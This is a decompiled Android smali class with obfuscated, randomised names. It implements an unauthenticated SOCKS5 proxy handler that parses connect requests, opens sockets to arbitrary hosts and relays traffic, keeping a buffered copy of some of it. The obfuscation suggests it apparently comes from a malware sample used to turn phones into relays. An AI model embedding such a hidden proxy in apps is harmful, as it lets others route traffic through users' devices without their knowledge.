.class public Lwocwvy/czyxoxmbauu/slsa/kuv/a;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field private a:Ljava/net/Socket;

.field private b:Ljava/lang/String;

.field private c:I


# direct methods
.method public constructor <init>(Ljava/net/Socket;)V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->b:Ljava/lang/String;

    const v0, 0x19000

    iput v0, p0, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->c:I

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a:Ljava/net/Socket;

    return-void
.end method


# virtual methods
.method public a(B)I
    .locals 0

    and-int/lit16 p1, p1, 0xff

    return p1
.end method

.method public run()V
    .locals 18

    move-object/from16 v1, p0

    :try_start_0
    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a:Ljava/net/Socket;

    invoke-virtual {v2}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v2

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a:Ljava/net/Socket;

    invoke-virtual {v3}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    iget v4, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->c:I

    new-array v4, v4, [B

    const/4 v5, 0x3

    const/4 v6, 0x0

    invoke-virtual {v2, v4, v6, v5}, Ljava/io/InputStream;->read([BII)I

    const/4 v7, 0x2

    new-array v8, v7, [B

    fill-array-data v8, :array_0

    const/16 v9, 0xa

    new-array v10, v9, [B

    invoke-virtual {v3, v8}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V

    invoke-virtual {v2, v4, v6, v9}, Ljava/io/InputStream;->read([BII)I

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v11, 0x4

    aget-byte v12, v4, v11

    invoke-virtual {v1, v12}, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a(B)I

    move-result v12

    invoke-virtual {v8, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v12, "."

    invoke-virtual {v8, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v12, 0x5

    aget-byte v13, v4, v12

    invoke-virtual {v1, v13}, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a(B)I

    move-result v13

    invoke-virtual {v8, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v13, "."

    invoke-virtual {v8, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v13, 0x6

    aget-byte v14, v4, v13

    invoke-virtual {v1, v14}, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a(B)I

    move-result v14

    invoke-virtual {v8, v14}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v14, "."

    invoke-virtual {v8, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v14, 0x7

    aget-byte v15, v4, v14

    invoke-virtual {v1, v15}, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a(B)I

    move-result v15

    invoke-virtual {v8, v15}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/16 v15, 0x8

    aget-byte v9, v4, v15

    invoke-virtual {v1, v9}, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a(B)I

    move-result v9

    mul-int/lit16 v9, v9, 0x100

    const/16 v16, 0x9

    aget-byte v15, v4, v16

    invoke-virtual {v1, v15}, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a(B)I

    move-result v15

    add-int/2addr v9, v15

    const-string v15, "viwbhhtpqlxexwwm"

    new-instance v14, Ljava/lang/StringBuilder;

    invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "Connected to "

    invoke-virtual {v14, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v13, ":"

    invoke-virtual {v14, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-static {v15, v13}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v13, Ljava/net/Socket;

    invoke-direct {v13, v8, v9}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    invoke-virtual {v13}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    invoke-virtual {v13}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v9

    new-array v14, v11, [B

    invoke-virtual {v13}, Ljava/net/Socket;->getLocalAddress()Ljava/net/InetAddress;

    move-result-object v14

    invoke-virtual {v14}, Ljava/net/InetAddress;->getAddress()[B

    move-result-object v14

    invoke-virtual {v13}, Ljava/net/Socket;->getLocalPort()I

    move-result v13

    aput-byte v12, v10, v6

    const/4 v15, 0x1

    aput-byte v6, v10, v15

    aput-byte v6, v10, v7

    aput-byte v15, v10, v5

    aget-byte v17, v14, v6

    aput-byte v17, v10, v11

    aget-byte v11, v14, v15

    aput-byte v11, v10, v12

    aget-byte v7, v14, v7

    const/4 v11, 0x6

    aput-byte v7, v10, v11

    aget-byte v5, v14, v5

    const/4 v7, 0x7

    aput-byte v5, v10, v7

    shr-int/lit8 v5, v13, 0x8

    int-to-byte v5, v5

    const/16 v7, 0x8

    aput-byte v5, v10, v7

    and-int/lit16 v5, v13, 0xff

    int-to-byte v5, v5

    aput-byte v5, v10, v16

    const/16 v5, 0xa

    invoke-virtual {v3, v10, v6, v5}, Ljava/io/OutputStream;->write([BII)V

    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V

    new-instance v5, Lwocwvy/czyxoxmbauu/slsa/kuv/b;

    invoke-direct {v5, v8, v3}, Lwocwvy/czyxoxmbauu/slsa/kuv/b;-><init>(Ljava/io/InputStream;Ljava/io/OutputStream;)V

    invoke-virtual {v5}, Lwocwvy/czyxoxmbauu/slsa/kuv/b;->start()V

    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    :goto_0
    iget v5, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->c:I

    invoke-virtual {v2, v4, v6, v5}, Ljava/io/InputStream;->read([BII)I

    move-result v5

    if-lez v5, :cond_0

    invoke-virtual {v9, v4, v6, v5}, Ljava/io/OutputStream;->write([BII)V

    invoke-virtual {v3, v4, v6, v5}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    invoke-virtual {v9}, Ljava/io/OutputStream;->flush()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :cond_0
    :try_start_1
    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a:Ljava/net/Socket;

    if-eqz v2, :cond_1

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a:Ljava/net/Socket;

    invoke-virtual {v2}, Ljava/net/Socket;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    return-void

    :catchall_0
    move-exception v0

    move-object v2, v0

    goto :goto_1

    :catch_0
    move-exception v0

    move-object v2, v0

    :try_start_2
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :try_start_3
    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a:Ljava/net/Socket;

    if-eqz v2, :cond_1

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a:Ljava/net/Socket;

    invoke-virtual {v2}, Ljava/net/Socket;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_1

    return-void

    :catch_1
    move-exception v0

    move-object v2, v0

    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    :cond_1
    return-void

    :goto_1
    :try_start_4
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a:Ljava/net/Socket;

    if-eqz v3, :cond_2

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/a;->a:Ljava/net/Socket;

    invoke-virtual {v3}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_2

    :catch_2
    move-exception v0

    move-object v3, v0

    invoke-virtual {v3}, Ljava/io/IOException;->printStackTrace()V

    :cond_2
    :goto_2
    throw v2

    :array_0
    .array-data 1
        0x5t
        0x0t
    .end array-data
.end method
